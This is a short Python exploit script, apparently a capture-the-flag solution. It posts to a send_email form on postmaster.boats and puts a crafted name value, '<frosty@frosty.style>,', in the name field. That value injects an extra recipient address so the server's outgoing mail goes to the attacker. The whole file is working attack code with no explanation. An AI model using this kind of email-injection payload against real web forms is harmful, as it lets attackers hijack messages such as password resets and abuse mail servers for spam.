import requests


def main():
    EMAIL = 'frosty@frosty.style'
    requests.post(
        'https://postmaster.boats/send_email',
        data={
            'name': '<' + EMAIL + '>,',
            'email': 'admin@email.invalid',
        },
        allow_redirects=False,
        timeout=1,
    )


if __name__ == '__main__':
    main()
